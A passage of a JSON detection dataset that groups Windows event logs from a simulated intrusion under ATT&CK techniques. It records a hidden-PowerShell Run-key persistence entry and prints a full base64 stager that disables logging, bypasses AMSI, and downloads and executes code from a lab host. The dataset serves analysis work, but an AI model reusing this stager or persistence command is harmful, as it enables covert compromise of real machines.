+            "service_hint": null,
+            "listen_port": 51071
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51071,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51072,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51072
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51072,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51072,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51073,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51073
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51073,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51074,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51074,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51074
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51074,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51073,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "svchost.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51075,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51075
+          },
+          {
+            "source_eid": 5158,
+            "image": "svchost.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51076,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51076
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 51075,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 51076,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51077,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51077
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51077,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51077,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51078,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51078
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51078,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51078,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51079,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51079
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51079,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51079,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51080,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51080
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51080,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51080,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "svchost.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51081,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51081
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51082,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51082
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 51081,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51082,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5156,
+            "image": "networkwatcheragent.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "169.254.169.254",
+            "src_port": 49988,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 3,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51082,
+            "dst_port": 80,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          },
+          {
+            "source_eid": 5158,
+            "image": "powershell.exe",
+            "src_ip": "0.0.0.0",
+            "dst_ip": null,
+            "src_port": 51083,
+            "dst_port": null,
+            "protocol": "TCP",
+            "direction": "listen",
+            "service_hint": null,
+            "listen_port": 51083
+          },
+          {
+            "source_eid": 5156,
+            "image": "powershell.exe",
+            "src_ip": "172.18.39.5",
+            "dst_ip": "10.10.10.5",
+            "src_port": 51083,
+            "dst_port": 80,
+            "protocol": "TCP",
+            "direction": "outbound",
+            "service_hint": "HTTP"
+          }
+        ]
+      },
+      "persistence": {
+        "registry_signals": [
+          {
+            "source_eid": 13,
+            "target_object": "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime",
+            "details": "QWORD (0x01d65fdf-0x38b2b2dc)",
+            "process_guid": "{b59756a9-996d-5f14-4900-000000000400}",
+            "image": "svchost.exe"
+          },
+          {
+            "source_eid": 13,
+            "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+            "details": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=$((gp HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x\"",
+            "process_guid": "{b59756a9-b239-5f17-5307-000000000400}",
+            "image": "powershell.exe"
+          },
+          {
+            "source_eid": 13,
+            "target_object": "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime",
+            "details": "QWORD (0x01d65fdf-0x423c4d4d)",
+            "process_guid": "{b59756a9-996d-5f14-4900-000000000400}",
+            "image": "svchost.exe"
+          },
+          {
+            "source_eid": 13,
+            "target_object": "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime",
+            "details": "QWORD (0x01d65fdf-0x4bc5a3ae)",
+            "process_guid": "{b59756a9-996d-5f14-4900-000000000400}",
+            "image": "svchost.exe"
+          }
+        ],
+        "registry_noise": [
+          {
+            "source_eid": 13,
+            "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VFUProvider\\StartTime",
+            "details": "QWORD (0x01d65fdf-0x39716c65)",
+            "process_guid": "{b59756a9-996d-5f14-4700-000000000400}",
+            "image": "svchost.exe"
+          },
+          {
+            "source_eid": 13,
+            "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug",
+            "details": "SQBmACgAJABQAFMAVgBlAHIAcwBpAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAFIAcwBpAE8ATgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJAA1ADcAQQBmADAAPQBbAFIARQBmAF0ALgBBAHMAcwBlAG0AQgBsAFkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANQA3AGEARgAwACkAewAkADQAOABBAGMANgA9ACQANQA3AGEAZgAwAC4ARwBlAFQAVgBhAGwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkADQAOABhAEMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABFAEMAVABJAE8AbgBTAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAHQAaQBPAE4AYQBSAFkAWwBzAFQAUgBpAG4ARwAsAFMAeQBTAFQARQBNAC4ATwBCAEoAZQBDAFQAXQBdADoAOgBOAEUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAQwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAQQBsAH0ARQBsAHMAZQB7AFsAUwBDAFIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AGUAKAAkAG4AdQBMAEwALAAoAE4AZQB3AC0ATwBiAGoAZQBDAFQAIABDAE8ATABMAEUAYwBUAGkAbwBuAFMALgBHAEUAbgBlAHIASQBDAC4ASABhAHMASABTAGUAVABbAFMAVAByAGkAbgBHAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAEYAXQAuAEEAcwBTAEUATQBiAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBsAGwALAAkAFQAUgB1AEUAKQA7AH0AOwBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBTAEUAUgBWAGkAQwBlAFAATwBJAE4AdABNAGEATgBBAEcAZQBSAF0AOgA6AEUAeABwAGUAYwB0ADEAMAAwAEMATwBOAFQASQBOAFUARQA9ADAAOwAkAEEAOQA0ADgANgA9AE4ARQBXAC0ATwBCAGoAZQBjAHQAIABTAHkAcwBUAGUAbQAuAE4ARQBUAC4AVwBFAGIAQwBMAGkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AQwBPAGQASQBuAEcAXQA6ADoAVQBOAEkAYwBvAGQAZQAuAEcAZQB0AFMAVAByAGkAbgBnACgAWwBDAG8ATgBWAEUAUgB0AF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABhADkANAA4ADYALgBIAGUAQQBkAEUAUgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABBADkANAA4ADYALgBQAHIAbwBYAFkAPQBbAFMAWQBTAFQARQBNAC4ATgBFAFQALgBXAEUAYgBSAEUAUQB1AEUAcwBUAF0AOgA6AEQARQBmAGEAdQBsAHQAVwBFAGIAUAByAG8AWABZADsAJABhADkANAA4ADYALgBQAHIATwBYAHkALgBDAHIARQBEAEUAbgBUAEkAYQBsAFMAIAA9ACAAWwBTAFkAUwBUAGUAbQAuAE4AZQBUAC4AQwBSAGUARABFAE4AdABJAGEAbABDAGEAQwBoAEUAXQA6ADoARABFAGYAYQBVAEwAdABOAEUAVABXAG8AUgBrAEMAcgBlAEQAZQBuAHQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQARQBNAC4AVABFAHgAVAAuAEUAbgBDAG8ARABJAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAVABFAFMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AG4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGEAOQA0ADgANgAuAEgAZQBBAGQAZQByAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AE8AdgBQAHYAYgB5AG0AZAAwAGIAVgBnAE0AUABxADQAZQA4AGIANABVAEcAMwBXAEsAbQBNAD0AIgApADsAJABkAEEAVABBAD0AJABBADkANAA4ADYALgBEAG8AdwBuAEwATwBBAGQARABBAFQAYQAoACQAcwBFAFIAKwAkAHQAKQA7ACQASQBWAD0AJABkAGEAdABhAFsAMAAuAC4AMwBdADsAJABEAEEAVABhAD0AJABEAEEAVABBAFsANAAuAC4AJABkAGEAVABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
+            "process_guid": "{b59756a9-b239-5f17-5307-000000000400}",
+            "image": "powershell.exe"
+          }
+        ],
+        "registry_noise_count": 2,
+        "dropped_files": []
+      },
+      "evasion": {
+        "log_cleared": [],
+        "deleted_files": [],
+        "obfuscated_cmdlines": []
+      }
+    }
+  },
+  {
+    "group_id": "T1087_002_42",
+    "technique_id": "T1087.002",
+    "technique_name": "Domain Account Discovery",
+    "anchor_eid": 4661,
+    "anchor_detail": {
+      "eid": 4661,
+      "time": "2020-07-22 04:18:51.001000+00:00",
+      "image": null,
+      "parent_image": null,
+      "cmdline": "",
+      "target_object": "",
+      "target_image": null,
+      "target_file": "",
+      "granted_access": null,
+      "query_name": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "user": "WEC$",
+      "integrity": null
+    },
+    "confidence": 1.0,
+    "all_idxs": [
+      27,
+      28,
+      42,
+      43,
+      49,
+      72,
+      78,
+      79,
+      80,
+      81,
+      82,
+      83,
+      84,
+      85,
+      86,
+      129,
+      130,
+      131,
+      155,
+      156,
+      157,
+      158,
+      159,
+      160,
+      161,
+      162,
+      163,
+      164,
+      165,
+      166,
+      457
+    ],
+    "features": {
+      "execution_context": {
+        "process_chains": [
+          {
+            "relation": "observed",
+            "child_image": "dns.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "lsass.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "svchost.exe",
+            "parent_image": null,
+            "source_eid": 3
+          },
+          {
+            "relation": "observed",
+            "child_image": "System",
+            "parent_image": null,
+            "source_eid": 3
+          }
+        ],
+        "chain_depth": 4
+      },
+      "command_script": {
+        "entries": [],
+        "has_obfuscation": false
+      },
+      "identity": {
+        "source_eid": 3,
+        "user": "NT AUTHORITY\\SYSTEM",
+        "domain": "NT AUTHORITY",
+        "logon_id": null,
+        "integrity_level": null,
+        "user_sid": null,
+        "privilege_list": null
+      },
+      "temporal": {
+        "anchor_time": "2020-07-22T04:18:51.001000+00:00",
+        "window_start_delta_sec": -1.0,
+        "window_end_delta_sec": 21.22,
+        "span_sec": 22.22,
+        "total_events": 31,
+        "event_density_per_10sec": 13.95,
+        "eid_counts": {
+          "3": 28,
+          "4661": 3
+        },
+        "inter_event_gap": {
+          "min_sec": 0.0,
+          "max_sec": 13.148,
+          "mean_sec": 0.741
+        },
+        "burst_detected": [
+          {
+            "eid": 3,
+            "count": 28,
+            "window_sec": 1.01
+          },
+          {
+            "eid": 4661,
+            "count": 3,
+            "window_sec": 0.0
+          }
+        ]
+      },
+      "network": {
+        "connections": [
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 53,
+            "dst_port": 49986,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 53,
+            "dst_port": 65336,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58086,
+            "dst_port": 49667,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58085,
+            "dst_port": 135,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 389,
+            "dst_port": 65337,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 389,
+            "dst_port": 65338,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "System",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58087,
+            "dst_port": 445,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": "SMB"
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58088,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58089,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.6",
+            "dst_ip": "172.18.38.5",
+            "src_port": 58090,
+            "dst_port": 389,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 53,
+            "dst_port": 54360,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "lsass.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 389,
+            "dst_port": 54361,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 53956,
+            "dst_port": 53,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": "DNS"
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 53,
+            "dst_port": 53956,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "dns.exe",
+            "src_ip": "0:0:0:0:0:0:0:1",
+            "dst_ip": "0:0:0:0:0:0:0:1",
+            "src_port": 53,
+            "dst_port": 55159,
+            "protocol": "udp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64872,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
+            "dst_ip": "172.18.38.6",
+            "src_port": 64873,
+            "dst_port": 5985,
+            "protocol": "tcp",
+            "direction": "outbound",
+            "service_hint": null
+          },
+          {
+            "source_eid": 3,
+            "image": "svchost.exe",
+            "src_ip": "172.18.38.5",
